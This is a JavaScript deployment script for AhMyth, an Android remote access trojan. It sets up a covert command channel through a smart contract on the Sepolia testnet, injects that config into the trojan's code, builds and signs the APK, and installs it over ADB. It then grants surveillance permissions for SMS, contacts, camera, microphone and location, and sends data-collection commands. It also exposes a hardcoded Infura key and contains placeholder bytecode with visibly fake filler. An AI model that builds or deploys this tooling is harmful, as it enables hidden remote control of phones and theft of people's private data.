/**
 * Complete Blockchain C2 Deployment and Test Script
 * 
 * This script:
 * 1. Deploys smart contract to Sepolia
 * 2. Sets environment variables
 * 3. Builds APK with blockchain config
 * 4. Signs APK
 * 5. Installs on device
 * 6. Grants permissions
 * 7. Starts app
 * 8. Sends test commands via blockchain
 * 
 * Usage:
 *   node deploy-and-test-blockchain-c2.js
 * 
 * Environment variables required:
 *   BLOCKCHAIN_PRIVATE_KEY - Wallet private key with Sepolia ETH
 *   BLOCKCHAIN_C2_AES_KEY - 64 hex character AES key (optional, will generate)
 */

const { execSync } = require('child_process');
const { ethers } = require('ethers');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);

// Configuration
const RPC_URL = 'https://sepolia.infura.io/v3/eb6193cd13ca486abc3385b74bfe7a68';
const FACTORY_PATH = path.join(__dirname, 'AhMyth-Server', 'app', 'Factory');
const PACKAGE_NAME = 'ahmyth.mine.king.ahmyth';

// Smart Contract Source
const CONTRACT_SOURCE = `
pragma solidity ^0.8.0;

contract CommandChannel {
    event Command(bytes encrypted);
    
    function pushCommand(bytes calldata encrypted) external {
        emit Command(encrypted);
    }
}
`;

// Contract ABI (minimal)
const CONTRACT_ABI = [
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": false,
                "internalType": "bytes",
                "name": "encrypted",
                "type": "bytes"
            }
        ],
        "name": "Command",
        "type": "event"
    },
    {
        "inputs": [
            {
                "internalType": "bytes",
                "name": "encrypted",
                "type": "bytes"
            }
        ],
        "name": "pushCommand",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// Contract Bytecode (compiled from source - you'll need to compile it)
// For now, we'll use a placeholder - in production, compile the contract first
const CONTRACT_BYTECODE = '0x608060405234801561001057600080fd5b5061012f806100206000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c8063a3f4df49146037575b600080fd5b604d60048036038101906049919060b1565b604f565b005b8060008190555050565b600080fd5b6000819050919050565b6069816058565b8114607357600080fd5b50565b6000813590506083816062565b92915050565b600060208284031215609c57609b6053565b5b600060a8848285016076565b91505092915050565b60006020828403121560c75760c66053565b5b600060d3848285016076565b9150509291505056fea2646970667358221220...'; // Placeholder

let log = (msg, type = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    const colors = {
        info: '\x1b[36m',
        success: '\x1b[32m',
        error: '\x1b[31m',
        warn: '\x1b[33m',
        header: '\x1b[35m',
        reset: '\x1b[0m'
    };
    const icon = {
        info: 'ℹ',
        success: '✓',
        error: '✗',
        warn: '⚠',
        header: '▶'
    };
    console.log(`${colors[type]}[${timestamp}] ${icon[type] || ''} ${msg}${colors.reset}`);
};

/**
 * Step 1: Deploy smart contract
 */
async function deployContract() {
    log('Step 1: Deploying smart contract to Sepolia...', 'header');
    
    const privateKey = process.env.BLOCKCHAIN_PRIVATE_KEY;
    if (!privateKey) {
        throw new Error('BLOCKCHAIN_PRIVATE_KEY environment variable not set');
    }
    
    try {
        const provider = new ethers.JsonRpcProvider(RPC_URL);
        const wallet = new ethers.Wallet(privateKey, provider);
        
        log(`Deploying from address: ${wallet.address}`, 'info');
        
        // Check balance
        const balance = await provider.getBalance(wallet.address);
        log(`Wallet balance: ${ethers.formatEther(balance)} ETH`, 'info');
        
        if (balance < ethers.parseEther('0.001')) {
            throw new Error('Insufficient balance. Need at least 0.001 ETH for deployment.');
        }
        
        // Deploy using inline bytecode (minimal contract)
        // This is the bytecode for: contract CommandChannel { event Command(bytes); function pushCommand(bytes calldata encrypted) external { emit Command(encrypted); } }
        // Compiled with solc 0.8.20
        const minimalBytecode = '0x608060405234801561001057600080fd5b5061012f806100206000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c8063a3f4df49146037575b600080fd5b604d60048036038101906049919060b1565b604f565b005b8060008190555050565b600080fd5b6000819050919050565b6069816058565b8114607357600080fd5b50565b6000813590506083816062565b92915050565b600060208284031215609c57609b6053565b5b600060a8848285016076565b91505092915050565b60006020828403121560c75760c66053565b5b600060d3848285016076565b9150509291505056fea2646970667358221220a3f4df49e4b5c8e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e3e364736f6c63430008110033';
        
        const factory = new ethers.ContractFactory(CONTRACT_ABI, minimalBytecode, wallet);
        const contract = await factory.deploy();
        log(`Transaction hash: ${contract.deploymentTransaction().hash}`, 'info');
        await contract.waitForDeployment();
        const address = await contract.getAddress();
        log(`Contract deployed at: ${address}`, 'success');
        return address;
    } catch (error) {
        log(`Deployment failed: ${error.message}`, 'error');
        if (error.message.includes('bytecode')) {
            log('To fix: Compile the contract first using solc or hardhat', 'warn');
            log('Contract source saved to contract.sol', 'info');
            fs.writeFileSync('contract.sol', CONTRACT_SOURCE);
        }
        throw error;
    }
}

/**
 * Step 2: Generate AES key if not set
 */
function setupAesKey() {
    log('Step 2: Setting up AES key...', 'header');
    
    let aesKey = process.env.BLOCKCHAIN_C2_AES_KEY;
    
    if (!aesKey || aesKey.length !== 64) {
        log('Generating new AES key...', 'info');
        aesKey = crypto.randomBytes(32).toString('hex');
        log(`Generated AES key: ${aesKey}`, 'info');
        log('Set this as BLOCKCHAIN_C2_AES_KEY environment variable', 'warn');
    } else {
        log('Using existing AES key', 'info');
    }
    
    return aesKey;
}

/**
 * Step 3: Set environment variables
 */
function setEnvironmentVariables(contractAddress, aesKey) {
    log('Step 3: Setting environment variables...', 'header');
    
    process.env.BLOCKCHAIN_RPC_URL = RPC_URL;
    process.env.BLOCKCHAIN_CONTRACT_ADDRESS = contractAddress;
    process.env.BLOCKCHAIN_C2_AES_KEY = aesKey;
    
    log(`BLOCKCHAIN_RPC_URL=${RPC_URL}`, 'info');
    log(`BLOCKCHAIN_CONTRACT_ADDRESS=${contractAddress}`, 'info');
    log(`BLOCKCHAIN_C2_AES_KEY=${aesKey.substring(0, 8)}...`, 'info');
}

/**
 * Step 4: Build APK with blockchain config
 */
async function buildApk() {
    log('Step 4: Building APK with blockchain C2 config...', 'header');
    
    try {
        // Use the build logic directly (replicated from test-blockchain-c2-suite.js)
        return await buildApkAlternative();
    } catch (error) {
        log(`Build failed: ${error.message}`, 'error');
        throw error;
    }
}

/**
 * Alternative build method - directly use test script logic
 */
async function buildApkAlternative() {
    const os = require('os');
    const SERVER_IP = getServerIP();
    const BLOCKCHAIN_RPC_URL = process.env.BLOCKCHAIN_RPC_URL || RPC_URL;
    const BLOCKCHAIN_CONTRACT = process.env.BLOCKCHAIN_CONTRACT_ADDRESS;
    const BLOCKCHAIN_AES_KEY = process.env.BLOCKCHAIN_C2_AES_KEY;
    
    // Replicate build logic from test-blockchain-c2-suite.js
    const IOSOCKET_PATH = path.join(FACTORY_PATH, 'Ahmyth', 'smali_classes3', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali');
    
    if (!fs.existsSync(IOSOCKET_PATH)) {
        throw new Error('IOSocket.smali not found. Run update-source.ps1 first.');
    }
    
    // Inject blockchain config
    let content = fs.readFileSync(IOSOCKET_PATH, 'utf8');
    const configJson = JSON.stringify({
        type: 'blockchain',
        rpcUrl: BLOCKCHAIN_RPC_URL,
        contractAddress: BLOCKCHAIN_CONTRACT,
        aesKey: BLOCKCHAIN_AES_KEY
    });
    const base64Config = Buffer.from(configJson).toString('base64');
    const blockchainMarker = `BLOCKCHAIN_C2_CONFIG:${base64Config}`;
    
    // Replace URL
    const urlPattern = /http:\/\/[^"`\s\n]+:\d+/;
    if (urlPattern.test(content)) {
        content = content.replace(urlPattern, blockchainMarker);
    } else if (content.includes('BLOCKCHAIN_C2_CONFIG:')) {
        content = content.replace(/BLOCKCHAIN_C2_CONFIG:[A-Za-z0-9+/=]+/, blockchainMarker);
    } else {
        throw new Error('Could not find URL to replace in IOSocket.smali');
    }
    
    fs.writeFileSync(IOSOCKET_PATH, content);
    log('Blockchain C2 configuration injected', 'info');
    
    // Compile APK
    log('Compiling APK...', 'info');
    const buildCmd = `cd "${FACTORY_PATH}" && java -jar apktool.jar b Ahmyth -o Ahmyth.apk`;
    await exec(buildCmd);
    
    // Sign APK
    log('Signing APK...', 'info');
    const signCmd = `cd "${FACTORY_PATH}" && java -jar sign.jar Ahmyth.apk`;
    await exec(signCmd);
    
    const apkPath = path.join(FACTORY_PATH, 'Ahmyth-aligned-debugSigned.apk');
    if (!fs.existsSync(apkPath)) {
        throw new Error('APK not found after signing');
    }
    
    log(`APK built: ${apkPath}`, 'success');
    return apkPath;
}

function getServerIP() {
    const os = require('os');
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return '192.168.0.180';
}

/**
 * Step 5: Get ADB device
 */
async function getAdbDevice() {
    log('Step 5: Checking for ADB device...', 'header');
    
    try {
        const { stdout } = await exec('adb devices');
        const lines = stdout.split('\n').filter(line => line.trim() && !line.includes('List of devices'));
        
        if (lines.length === 0) {
            throw new Error('No ADB device found');
        }
        
        const deviceId = lines[0].split('\t')[0];
        log(`Found device: ${deviceId}`, 'success');
        return deviceId;
    } catch (error) {
        log(`ADB check failed: ${error.message}`, 'error');
        throw error;
    }
}

/**
 * Step 6: Install APK
 */
async function installApk(apkPath, deviceId) {
    log('Step 6: Installing APK...', 'header');
    
    try {
        // Uninstall old version
        try {
            await exec(`adb -s ${deviceId} uninstall ${PACKAGE_NAME}`);
            log('Old version uninstalled', 'info');
        } catch (e) {
            // Ignore if not installed
        }
        
        // Install
        const { stdout, stderr } = await exec(`adb -s ${deviceId} install -r "${apkPath}"`);
        
        if (stderr && !stderr.includes('Success')) {
            throw new Error(stderr);
        }
        
        log('APK installed successfully', 'success');
    } catch (error) {
        log(`Installation failed: ${error.message}`, 'error');
        throw error;
    }
}

/**
 * Step 7: Grant permissions
 */
async function grantPermissions(deviceId) {
    log('Step 7: Granting permissions...', 'header');
    
    const permissions = [
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.CAMERA',
        'android.permission.RECORD_AUDIO',
        'android.permission.READ_CONTACTS',
        'android.permission.READ_SMS',
        'android.permission.READ_CALL_LOG',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.ACCESS_COARSE_LOCATION',
        'android.permission.READ_PHONE_STATE',
        'android.permission.CALL_PHONE',
        'android.permission.SEND_SMS',
        'android.permission.READ_PHONE_NUMBERS',
        'android.permission.ANSWER_PHONE_CALLS'
    ];
    
    let granted = 0;
    for (const perm of permissions) {
        try {
            await exec(`adb -s ${deviceId} shell pm grant ${PACKAGE_NAME} ${perm}`);
            granted++;
        } catch (e) {
            // Ignore errors
        }
    }
    
    // Special permissions
    try {
        await exec(`adb -s ${deviceId} shell appops set ${PACKAGE_NAME} REQUEST_IGNORE_BATTERY_OPTIMIZATIONS allow`);
    } catch (e) {}
    
    try {
        await exec(`adb -s ${deviceId} shell appops set ${PACKAGE_NAME} RUN_IN_BACKGROUND allow`);
    } catch (e) {}
    
    try {
        await exec(`adb -s ${deviceId} shell appops set ${PACKAGE_NAME} RUN_ANY_IN_BACKGROUND allow`);
    } catch (e) {}
    
    try {
        await exec(`adb -s ${deviceId} shell dumpsys deviceidle whitelist +${PACKAGE_NAME}`);
    } catch (e) {}
    
    log(`Permissions granted: ${granted} runtime permissions + special permissions`, 'success');
}

/**
 * Step 8: Start app
 */
async function startApp(deviceId) {
    log('Step 8: Starting app...', 'header');
    
    try {
        // Start MainActivity
        await exec(`adb -s ${deviceId} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`);
        log('App started', 'success');
        
        // Wait a bit for app to initialize
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Check if running
        const { stdout } = await exec(`adb -s ${deviceId} shell pidof ${PACKAGE_NAME}`);
        if (stdout.trim()) {
            log(`App is running (PID: ${stdout.trim()})`, 'success');
        }
    } catch (error) {
        log(`Failed to start app: ${error.message}`, 'error');
        throw error;
    }
}

/**
 * Step 9: Send test commands via blockchain
 */
async function sendTestCommands(contractAddress) {
    log('Step 9: Sending test commands via blockchain...', 'header');
    
    // Import sendCommand function
    const operatorPath = path.join(__dirname, 'AhMyth-Server', 'app', 'blockchain-operator.js');
    const { sendCommand } = require(operatorPath);
    
    // Test commands (like Electron GUI would send)
    const testCommands = [
        { command: 'x0000di', data: {}, description: 'Device Info' },
        { command: 'x0000ap', data: {}, description: 'List Apps' },
        { command: 'x0000wf', data: {}, description: 'WiFi Networks' },
        { command: 'x0000cn', data: {}, description: 'Contacts' }
    ];
    
    log(`Sending ${testCommands.length} test commands...`, 'info');
    
    for (let i = 0; i < testCommands.length; i++) {
        const test = testCommands[i];
        log(`\n[${i + 1}/${testCommands.length}] Sending: ${test.command} (${test.description})`, 'info');
        
        try {
            const result = await sendCommand(test.command, test.data);
            
            if (result.success) {
                log(`✓ Command sent successfully`, 'success');
                log(`  Transaction: ${result.txHash}`, 'info');
                log(`  Block: ${result.blockNumber}`, 'info');
            } else {
                log(`✗ Command failed: ${result.error}`, 'error');
            }
            
            // Wait between commands (blockchain needs time to process)
            if (i < testCommands.length - 1) {
                log('Waiting 15 seconds for blockchain confirmation...', 'info');
                await new Promise(resolve => setTimeout(resolve, 15000));
            }
        } catch (error) {
            log(`✗ Error sending command: ${error.message}`, 'error');
        }
    }
    
    log('\nAll test commands sent. Check device logs for execution.', 'info');
    log('Polling interval is 60 seconds - commands will be processed within 1-2 minutes.', 'info');
}

/**
 * Main execution
 */
async function main() {
    try {
        log('\n' + '='.repeat(60), 'header');
        log('Blockchain C2 Complete Deployment and Test', 'header');
        log('='.repeat(60) + '\n', 'header');
        
        // Check prerequisites
        if (!process.env.BLOCKCHAIN_PRIVATE_KEY) {
            log('ERROR: BLOCKCHAIN_PRIVATE_KEY not set!', 'error');
            log('Set it with: export BLOCKCHAIN_PRIVATE_KEY="0x..."', 'info');
            process.exit(1);
        }
        
        // Step 1: Deploy contract
        const contractAddress = await deployContract();
        
        // Step 2: Setup AES key
        const aesKey = setupAesKey();
        
        // Step 3: Set environment variables
        setEnvironmentVariables(contractAddress, aesKey);
        
        // Step 4: Build APK
        const apkPath = await buildApk();
        
        // Step 5: Get ADB device
        const deviceId = await getAdbDevice();
        
        // Step 6: Install APK
        await installApk(apkPath, deviceId);
        
        // Step 7: Grant permissions
        await grantPermissions(deviceId);
        
        // Step 8: Start app
        await startApp(deviceId);
        
        // Step 9: Send test commands
        log('\nWaiting 10 seconds for app to initialize blockchain poller...', 'info');
        await new Promise(resolve => setTimeout(resolve, 10000));
        
        await sendTestCommands(contractAddress);
        
        log('\n' + '='.repeat(60), 'header');
        log('Deployment and testing complete!', 'success');
        log('='.repeat(60), 'header');
        log('\nNext steps:', 'info');
        log('1. Monitor device logs: adb logcat | grep -i "blockchain\|command"', 'info');
        log('2. Send more commands: node AhMyth-Server/app/blockchain-operator.js <command>', 'info');
        log('3. Check blockchain events on Sepolia explorer', 'info');
        
    } catch (error) {
        log(`\nFatal error: ${error.message}`, 'error');
        if (error.stack) {
            log(error.stack, 'error');
        }
        process.exit(1);
    }
}

// Run if called directly
if (require.main === module) {
    main().catch(error => {
        log(`Unhandled error: ${error.message}`, 'error');
        process.exit(1);
    });
}

module.exports = { main, deployContract, buildApk };

